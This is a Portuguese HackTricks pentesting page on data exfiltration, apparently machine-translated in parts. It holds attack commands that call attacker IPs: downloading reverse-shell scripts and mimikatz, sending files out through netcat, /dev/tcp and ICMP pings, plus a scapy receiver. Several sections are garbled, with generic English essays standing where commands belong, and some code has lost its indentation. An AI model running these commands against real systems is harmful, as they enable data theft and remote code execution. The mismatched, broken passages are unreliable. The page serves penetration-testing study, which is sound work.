# Exfiltração

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Domínios comumente permitidos para exfiltrar informações

Verifique [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente permitidos que podem ser abusados

## Copiar e Colar Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of Windows systems, exfiltration can occur through various methods and techniques. This section will discuss some common methodologies and resources that can be used for exfiltration on Windows.

1. **File Transfer Protocol (FTP)**: FTP is a standard network protocol used for transferring files between a client and a server. Attackers can leverage FTP to exfiltrate data from a compromised Windows system to an external FTP server.

2. **Hypertext Transfer Protocol (HTTP)**: HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by sending it as part of HTTP requests to a remote server.

3. **Domain Name System (DNS)**: DNS is responsible for translating domain names into IP addresses. Attackers can abuse DNS to exfiltrate data by encoding it into DNS queries or responses and sending it to a malicious DNS server.

4. **Email**: Attackers can exfiltrate data by sending it as email attachments or by using email protocols such as SMTP (Simple Mail Transfer Protocol) or POP3 (Post Office Protocol 3) to transfer data to an external email server.

5. **Cloud Storage**: Attackers can leverage cloud storage services such as Dropbox, Google Drive, or Microsoft OneDrive to exfiltrate data from a compromised Windows system to the cloud.

6. **Remote File Inclusion (RFI)**: RFI is a vulnerability that allows an attacker to include remote files on a web server. Attackers can exploit RFI to exfiltrate data by including a file that contains the data they want to exfiltrate.

7. **Command and Control (C2) Channels**: Attackers can establish covert communication channels with a compromised Windows system to exfiltrate data. This can be done using various techniques such as DNS tunneling, covert channels over HTTP, or using encrypted communication protocols.

It is important for defenders to be aware of these exfiltration methodologies and resources in order to detect and prevent data exfiltration attempts on Windows systems. Implementing proper network monitoring, access controls, and security measures can help mitigate the risk of data exfiltration.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### Exfiltração via HTTP

A exfiltração de dados via HTTP é uma técnica comum usada por hackers para transferir informações confidenciais de um sistema comprometido para um servidor controlado pelo atacante. Essa técnica aproveita o protocolo HTTP, que é amplamente utilizado para comunicação na web.

Existem várias maneiras de realizar a exfiltração de dados via HTTP. Alguns métodos comuns incluem:

1. **Codificação em Base64**: Os dados são convertidos em uma representação codificada em Base64 antes de serem enviados via HTTP. Isso permite que os dados sejam transmitidos como texto legível, mas em uma forma que não seja facilmente reconhecível.

2. **Esteganografia**: Os dados são ocultados em arquivos de imagem, áudio ou vídeo e, em seguida, enviados via HTTP. Essa técnica explora o fato de que os arquivos multimídia podem conter informações ocultas que não são perceptíveis aos olhos humanos.

3. **Túneis HTTP**: Os dados são encapsulados em pacotes HTTP e enviados por meio de uma conexão HTTP normal. Isso permite que os dados sejam transmitidos sem chamar a atenção, pois a comunicação ocorre por meio de um canal legítimo.

4. **Fragmentação de pacotes**: Os dados são divididos em pequenos fragmentos e enviados em várias solicitações HTTP. Essa técnica dificulta a detecção da exfiltração de dados, pois cada solicitação individual pode parecer inofensiva.

É importante ressaltar que a exfiltração de dados via HTTP pode ser detectada e bloqueada por firewalls e sistemas de segurança. Portanto, os hackers geralmente usam técnicas de evasão para evitar a detecção, como a criptografia dos dados ou a utilização de portas não padrão.

Para se proteger contra a exfiltração de dados via HTTP, é recomendado o uso de firewalls, sistemas de detecção de intrusão e monitoramento de tráfego de rede. Além disso, é importante manter os sistemas atualizados e implementar boas práticas de segurança, como senhas fortes e autenticação em dois fatores.
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of Windows systems, exfiltration can occur through various methods and techniques. This section will discuss some common methodologies and resources that can be used for exfiltration on Windows.

1. **File Transfer Protocol (FTP)**: FTP is a standard network protocol used for transferring files between a client and a server. Attackers can leverage FTP to exfiltrate data from a compromised Windows system to an external FTP server.

2. **Hypertext Transfer Protocol (HTTP)**: HTTP is the protocol used for transmitting data over the internet. Attackers can use HTTP to exfiltrate data by disguising it as legitimate web traffic. This can be done by encoding the data within HTTP requests or by using covert channels such as steganography.

3. **Domain Name System (DNS)**: DNS is responsible for translating domain names into IP addresses. Attackers can abuse DNS to exfiltrate data by encoding it within DNS queries or responses. This technique is known as DNS tunneling.

4. **Email**: Attackers can exfiltrate data by sending it as email attachments or by using email protocols such as SMTP or POP3. This method can be effective for exfiltrating small amounts of data without raising suspicion.

5. **Cloud Storage**: Attackers can leverage cloud storage services such as Dropbox, Google Drive, or OneDrive to exfiltrate data from a compromised Windows system. By uploading the data to a cloud storage account, the attacker can access it from anywhere.

6. **Remote Access Tools**: Remote access tools like TeamViewer or VNC can be used by attackers to gain remote control of a compromised Windows system. Once access is established, the attacker can exfiltrate data by transferring it directly to their own system.

7. **Covert Channels**: Attackers can create covert channels to exfiltrate data from a compromised Windows system. Covert channels involve hiding data within seemingly innocuous communication channels, such as ICMP packets or unused protocol fields.

It is important for defenders to be aware of these exfiltration methodologies and resources in order to detect and prevent data exfiltration attempts on Windows systems. Implementing network monitoring, intrusion detection systems, and data loss prevention measures can help in identifying and mitigating exfiltration attempts.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Enviar arquivos

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimindo GET e POSTs (também cabeçalhos)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Servidor HTTPS**

Um servidor HTTPS é um servidor que utiliza o protocolo HTTPS para fornecer comunicação segura e criptografada entre o cliente e o servidor. O HTTPS utiliza o protocolo SSL/TLS para criptografar os dados transmitidos, garantindo assim a confidencialidade e integridade das informações.

Para exfiltrar dados de um servidor HTTPS, existem várias técnicas que podem ser utilizadas. Alguns exemplos incluem:

- **Túnel HTTPS**: Esta técnica envolve o uso de um túnel HTTPS para enviar os dados exfiltrados para um servidor remoto. O túnel HTTPS permite que os dados sejam transmitidos de forma segura e criptografada, evitando a detecção.

- **Injeção de dados**: Nesta técnica, os dados exfiltrados são injetados em solicitações HTTPS legítimas. Isso pode ser feito através da manipulação de parâmetros de solicitação ou da exploração de vulnerabilidades em aplicativos web.

- **Canais ocultos**: Os canais ocultos são técnicas que permitem a exfiltração de dados através de canais não convencionais. Isso pode incluir o uso de campos de cabeçalho HTTP, cookies ou outros campos de metadados para transmitir os dados exfiltrados.

- **Ataques de força bruta**: Em alguns casos, é possível realizar ataques de força bruta contra servidores HTTPS para obter acesso não autorizado e exfiltrar dados. Isso pode envolver a tentativa de adivinhar senhas ou chaves de criptografia.

É importante ressaltar que a exfiltração de dados de um servidor HTTPS é uma atividade ilegal e antiética, a menos que seja realizada como parte de um teste de penetração autorizado. Sempre obtenha permissão adequada antes de realizar qualquer atividade de hacking.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Servidor FTP (python)

O protocolo de transferência de arquivos (FTP) é um método comum para transferir arquivos entre um cliente e um servidor. O servidor FTP é um software que permite aos usuários se conectarem e transferirem arquivos para o servidor.

Existem várias implementações de servidores FTP disponíveis, incluindo uma implementação em Python. O servidor FTP em Python é uma opção popular devido à sua simplicidade e facilidade de uso.

Para configurar um servidor FTP em Python, você pode usar a biblioteca `pyftpdlib`. Essa biblioteca fornece uma API fácil de usar para criar um servidor FTP personalizado.

Aqui está um exemplo básico de como configurar um servidor FTP em Python usando `pyftpdlib`:

```python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

# Configurar autorizador
authorizer = DummyAuthorizer()
authorizer.add_user("usuario", "senha", "/caminho/do/diretorio", perm="elradfmw")

# Configurar manipulador
handler = FTPHandler
handler.authorizer = authorizer

# Configurar servidor
server = FTPServer(("0.0.0.0", 21), handler)

# Iniciar servidor
server.serve_forever()
```

Neste exemplo, estamos configurando um servidor FTP que escuta em todas as interfaces de rede (`0.0.0.0`) na porta 21. Também estamos configurando um autorizador fictício com um usuário, senha e diretório raiz. O servidor FTP será executado indefinidamente até que seja interrompido.

Depois de configurar o servidor FTP, você pode se conectar a ele usando um cliente FTP, como o FileZilla, e transferir arquivos para o servidor.

O servidor FTP em Python é uma ótima opção para criar um ambiente de teste ou para fins de aprendizado. No entanto, para um ambiente de produção, é recomendável usar uma implementação de servidor FTP mais robusta e segura.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Servidor FTP (NodeJS)

O servidor FTP é uma aplicação que permite a transferência de arquivos entre um cliente e um servidor usando o protocolo FTP (File Transfer Protocol). Neste exemplo, vamos criar um servidor FTP usando o NodeJS.

#### Configuração do servidor FTP

Primeiro, precisamos instalar o pacote `ftp-srv` do NodeJS. Execute o seguinte comando no terminal:

```bash
npm install ftp-srv
```

Em seguida, crie um arquivo `server.js` e adicione o seguinte código:

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://localhost:21',
  pasv_url: 'ftp://localhost:3000',
  pasv_min: 3001,
  pasv_max: 3010,
  anonymous: true,
  greeting: 'Welcome to the FTP server!',
});

ftpServer.on('login', ({ connection, username, password }, resolve, reject) => {
  if (username === 'anonymous' && password === '') {
    resolve({ root: '/path/to/ftp/root' });
  } else {
    reject(new Error('Invalid username or password'));
  }
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((err) => {
    console.error('Error starting FTP server:', err);
  });
```

Certifique-se de substituir `/path/to/ftp/root` pelo caminho absoluto para a pasta raiz do servidor FTP.

#### Executando o servidor FTP

Para iniciar o servidor FTP, execute o seguinte comando no terminal:

```bash
node server.js
```

O servidor FTP estará disponível em `ftp://localhost:21`. Os usuários podem se conectar usando um cliente FTP e fazer upload ou download de arquivos.

#### Considerações finais

Este é apenas um exemplo básico de como criar um servidor FTP usando o NodeJS. Você pode personalizar o código de acordo com suas necessidades e adicionar recursos adicionais, como autenticação de usuário, criptografia SSL/TLS e restrições de acesso.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Servidor FTP (pure-ftp)

O servidor FTP (pure-ftp) é uma ferramenta comumente usada para transferir arquivos entre sistemas. No entanto, também pode ser explorado por hackers para exfiltrar dados de um sistema comprometido.

#### Exfiltração de dados via FTP

A exfiltração de dados via FTP envolve o envio de arquivos do sistema comprometido para um servidor FTP controlado pelo hacker. Isso permite que o hacker acesse os dados exfiltrados posteriormente.

Existem várias maneiras de realizar a exfiltração de dados via FTP, incluindo:

1. **Upload direto**: O hacker pode fazer o upload dos arquivos diretamente para o servidor FTP usando um cliente FTP ou uma ferramenta automatizada.

2. **Túnel FTP**: O hacker pode criar um túnel FTP para transferir os arquivos exfiltrados. Isso envolve o redirecionamento do tráfego FTP através de um servidor intermediário controlado pelo hacker.

3. **Comando STOR**: O hacker pode explorar uma vulnerabilidade no servidor FTP para executar um comando STOR malicioso, que permite o upload de arquivos para o servidor FTP.

#### Mitigação de exfiltração de dados via FTP

Para mitigar a exfiltração de dados via FTP, é importante implementar as seguintes medidas de segurança:

1. **Monitoramento de tráfego**: Monitore o tráfego de rede em busca de atividades suspeitas, como transferências de arquivos FTP não autorizadas.

2. **Restrição de acesso**: Limite o acesso ao servidor FTP apenas a usuários autorizados e implemente autenticação forte, como senhas complexas e autenticação de dois fatores.

3. **Atualizações regulares**: Mantenha o servidor FTP atualizado com as últimas correções de segurança para evitar a exploração de vulnerabilidades conhecidas.

4. **Firewall**: Configure um firewall para filtrar o tráfego de FTP e bloquear conexões não autorizadas.

5. **Criptografia**: Use criptografia para proteger as transferências de arquivos FTP, garantindo que os dados exfiltrados não possam ser interceptados e lidos por terceiros.

Ao implementar essas medidas de segurança, você pode reduzir significativamente o risco de exfiltração de dados via FTP e proteger seus sistemas contra ataques de hackers.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Cliente **Windows**

#### Exfiltração de Dados

A exfiltração de dados é o processo de transferir informações confidenciais de um sistema comprometido para um local controlado pelo atacante. Existem várias técnicas que podem ser usadas para exfiltrar dados de um cliente Windows comprometido.

#### Técnicas de Exfiltração de Dados

1. **HTTP/S**: Os dados podem ser exfiltrados usando solicitações HTTP/S para um servidor controlado pelo atacante. Isso pode ser feito usando bibliotecas de terceiros ou scripts personalizados.

2. **DNS**: Os dados podem ser exfiltrados usando consultas DNS modificadas para incluir informações confidenciais. O atacante pode controlar um servidor DNS para receber essas consultas e extrair os dados.

3. **SMTP**: Os dados podem ser exfiltrados por e-mail usando o protocolo SMTP. O atacante pode configurar um servidor de e-mail para receber os dados exfiltrados.

4. **FTP**: Os dados podem ser exfiltrados usando o protocolo FTP para transferir arquivos para um servidor controlado pelo atacante.

5. **Túneis**: Os dados podem ser exfiltrados usando túneis criptografados, como SSH ou VPN, para transferir os dados para um servidor controlado pelo atacante.

#### Ferramentas de Exfiltração de Dados

Existem várias ferramentas disponíveis para facilitar a exfiltração de dados de um cliente Windows comprometido. Algumas dessas ferramentas incluem:

- **Cobalt Strike**: Uma plataforma de teste de penetração que inclui recursos de exfiltração de dados.

- **PowerShell Empire**: Um framework de pós-exploração que possui módulos para exfiltração de dados.

- **Metasploit**: Um framework de teste de penetração que possui módulos para exfiltração de dados.

- **Ncat**: Uma ferramenta de linha de comando que pode ser usada para criar conexões de rede e transferir dados.

#### Considerações Finais

A exfiltração de dados é uma etapa crítica no processo de comprometimento de um cliente Windows. É importante que os profissionais de segurança estejam cientes das técnicas e ferramentas utilizadas pelos atacantes para poderem detectar e prevenir a exfiltração de dados.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre as vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha de tecnologia, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali como servidor
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou crie um compartilhamento smb **usando o samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltração de Dados

A exfiltração de dados é o processo de transferir informações confidenciais de um sistema comprometido para um local controlado pelo atacante. Existem várias técnicas que podem ser usadas para realizar a exfiltração de dados em sistemas Windows.

## Técnicas de Exfiltração de Dados

### 1. Uso de Protocolos de Rede

Os protocolos de rede, como HTTP, DNS e SMTP, podem ser explorados para exfiltrar dados. Os atacantes podem codificar as informações em pacotes de rede e enviá-los para um servidor controlado por eles. Isso permite que os dados sejam transferidos sem chamar muita atenção.

### 2. Uso de Técnicas de Esteganografia

A esteganografia é a prática de ocultar informações dentro de arquivos aparentemente inofensivos, como imagens ou documentos. Os atacantes podem usar essa técnica para esconder dados confidenciais e, em seguida, transferi-los para fora do sistema comprometido.

### 3. Uso de Técnicas de Tunneling

As técnicas de tunneling envolvem encapsular o tráfego de rede dentro de outro protocolo, como o HTTP ou o DNS. Isso permite que os atacantes evitem a detecção, pois o tráfego parece ser tráfego legítimo.

### 4. Uso de Dispositivos de Armazenamento Removíveis

Os atacantes também podem usar dispositivos de armazenamento removíveis, como unidades USB, para exfiltrar dados. Eles podem copiar os arquivos confidenciais para o dispositivo e, em seguida, remover o dispositivo do sistema comprometido.

## Ferramentas de Exfiltração de Dados

Existem várias ferramentas disponíveis para ajudar os atacantes a realizar a exfiltração de dados em sistemas Windows. Algumas dessas ferramentas incluem:

- **Cobalt Strike**: Uma plataforma de teste de penetração que possui recursos de exfiltração de dados.
- **PowerShell Empire**: Um framework de pós-exploração que permite a exfiltração de dados usando várias técnicas.
- **Metasploit**: Uma ferramenta de teste de penetração que também possui recursos de exfiltração de dados.

## Mitigação da Exfiltração de Dados

Para mitigar a exfiltração de dados em sistemas Windows, é importante implementar as seguintes práticas de segurança:

- Monitorar o tráfego de rede em busca de atividades suspeitas.
- Implementar firewalls e sistemas de detecção de intrusão para bloquear ou alertar sobre tentativas de exfiltração de dados.
- Manter os sistemas operacionais e aplicativos atualizados com os patches de segurança mais recentes.
- Educar os usuários sobre práticas seguras de computação e conscientização sobre phishing e engenharia social.

Ao implementar essas práticas de segurança, é possível reduzir o risco de exfiltração de dados em sistemas Windows.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

O atacante precisa ter o SSHd em execução.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Se o alvo tiver SSH, o atacante pode montar um diretório do alvo para o atacante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

O comando `nc` (netcat) é uma ferramenta versátil que pode ser usada para exfiltrar dados de um sistema comprometido. O `nc` pode ser usado tanto como um servidor quanto como um cliente, permitindo a transferência de dados entre duas máquinas.

### Exfiltração de dados usando o `nc`

Para exfiltrar dados usando o `nc`, primeiro é necessário configurar um servidor `nc` em uma máquina controlada pelo atacante. Isso pode ser feito usando o seguinte comando:

```
nc -l -p <porta> > <arquivo_de_saida>
```

Onde `<porta>` é a porta em que o servidor `nc` estará ouvindo e `<arquivo_de_saida>` é o nome do arquivo onde os dados exfiltrados serão armazenados.

Em seguida, no sistema comprometido, os dados podem ser enviados para o servidor `nc` usando o seguinte comando:

```
cat <arquivo_de_origem> | nc <endereço_do_servidor> <porta>
```

Onde `<arquivo_de_origem>` é o arquivo que contém os dados a serem exfiltrados, `<endereço_do_servidor>` é o endereço IP ou nome de domínio do servidor `nc` e `<porta>` é a porta em que o servidor `nc` está ouvindo.

### Exemplo de uso do `nc` para exfiltrar dados

Suponha que você queira exfiltrar um arquivo chamado `dados.txt` de um sistema comprometido para um servidor `nc` em `192.168.0.100` na porta `1234`. Você pode fazer isso executando os seguintes comandos:

No servidor `nc`:

```
nc -l -p 1234 > dados.txt
```

No sistema comprometido:

```
cat dados.txt | nc 192.168.0.100 1234
```

Isso enviará o conteúdo do arquivo `dados.txt` para o servidor `nc` no endereço `192.168.0.100` na porta `1234`, onde será armazenado no arquivo `dados.txt` no servidor.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

Replace `<victim_ip>` with the IP address of the victim's machine and `<port>` with the desired port number. `<local_file>` should be replaced with the name and path of the file you want to save on your local machine.

This command will read the contents of the file on the victim's machine and redirect it to the specified local file on your machine.

### Upload file to victim

To upload a file to the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat < <local_file> > /dev/tcp/<victim_ip>/<port>
```

Replace `<local_file>` with the name and path of the file you want to upload. `<victim_ip>` should be replaced with the IP address of the victim's machine, and `<port>` should be replaced with the desired port number.

This command will read the contents of the local file and redirect it to the specified location on the victim's machine.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Enviar arquivo para a vítima

Uma maneira comum de exfiltrar dados é enviando um arquivo para a vítima. Isso pode ser feito de várias maneiras, como anexando o arquivo a um e-mail, enviando-o por meio de um serviço de mensagens ou fazendo o upload para um servidor da vítima.

#### Anexando o arquivo a um e-mail

Uma abordagem simples é anexar o arquivo a um e-mail e enviá-lo para a vítima. Isso pode ser feito usando um cliente de e-mail ou automatizando o processo por meio de um script ou ferramenta de linha de comando.

#### Enviando o arquivo por meio de um serviço de mensagens

Outra opção é enviar o arquivo por meio de um serviço de mensagens, como o WhatsApp, Telegram ou qualquer outro aplicativo de mensagens que a vítima esteja usando. Isso pode ser feito compartilhando o arquivo diretamente com a vítima ou enviando-o para um grupo em que a vítima esteja presente.

#### Fazendo o upload para um servidor da vítima

Se a vítima tiver um servidor acessível pela internet, você pode fazer o upload do arquivo diretamente para esse servidor. Isso pode ser feito usando protocolos como FTP, SCP ou SFTP. Certifique-se de ter as credenciais corretas para acessar o servidor da vítima antes de realizar o upload.

Lembre-se de que a exfiltração de dados é uma atividade ilegal e antiética, a menos que seja realizada como parte de um teste de penetração autorizado. Sempre obtenha permissão por escrito antes de realizar qualquer atividade de hacking.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
ICMP (Internet Control Message Protocol) é um protocolo de controle de mensagens da Internet que é usado para enviar mensagens de erro e informações de controle entre dispositivos em uma rede IP. O ICMP é frequentemente usado para testar a conectividade de rede e diagnosticar problemas de rede. Ele também pode ser usado como um método de exfiltração de dados, onde os dados são ocultados em pacotes ICMP para serem transmitidos de forma furtiva pela rede. A exfiltração de dados por meio do ICMP pode ser realizada usando várias técnicas, como a técnica de ping exfiltration, onde os dados são divididos em pacotes ICMP e enviados para um servidor remoto. No entanto, a exfiltração de dados por meio do ICMP pode ser detectada por firewalls e sistemas de detecção de intrusão, portanto, é importante tomar medidas para evitar a detecção, como criptografar os dados antes de enviá-los.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Se você pode enviar dados para um servidor SMTP, você pode criar um SMTP para receber os dados com python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Por padrão no XP e 2003 (em outros sistemas é necessário adicioná-lo explicitamente durante a instalação)

No Kali, **inicie o servidor TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Servidor TFTP em Python:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Receive the request packet
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Check if it's a read request (RRQ)
        if opcode == 1:
            # Extract the filename from the request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Open the file and read its contents
            try:
                with open(filename, 'rb') as file:
                    file_data = file.read()
            except FileNotFoundError:
                # Send an error packet if the file doesn't exist
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)
                continue

            # Split the file data into 512-byte chunks
            chunks = [file_data[i:i+512] for i in range(0, len(file_data), 512)]

            # Send the file data in separate data packets
            for i, chunk in enumerate(chunks):
                data_packet = struct.pack('!HH', 3, i+1) + chunk
                server_socket.sendto(data_packet, client_address)

            # Send an empty data packet to indicate the end of transmission
            server_socket.sendto(struct.pack('!HH', 3, len(chunks)+1), client_address)

        # Check if it's a write request (WRQ)
        elif opcode == 2:
            # Extract the filename from the request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Receive the file data in separate data packets
            file_data = b''
            block_number = 1
            while True:
                data_packet, client_address = server_socket.recvfrom(516)
                opcode = struct.unpack('!H', data_packet[:2])[0]

                # Check if it's the expected data packet
                if opcode == 3 and struct.unpack('!H', data_packet[2:4])[0] == block_number:
                    # Append the data to the file data
                    file_data += data_packet[4:]

                    # Send an acknowledgement packet
                    ack_packet = struct.pack('!HH', 4, block_number)
                    server_socket.sendto(ack_packet, client_address)

                    # Check if it's the last data packet
                    if len(data_packet) < 516:
                        break

                    # Increment the block number
                    block_number += 1

            # Write the file data to disk
            with open(filename, 'wb') as file:
                file.write(file_data)

    # Close the socket
    server_socket.close()

if __name__ == '__main__':
    tftp_server()
```

Este é um exemplo de um servidor TFTP (Trivial File Transfer Protocol) implementado em Python.

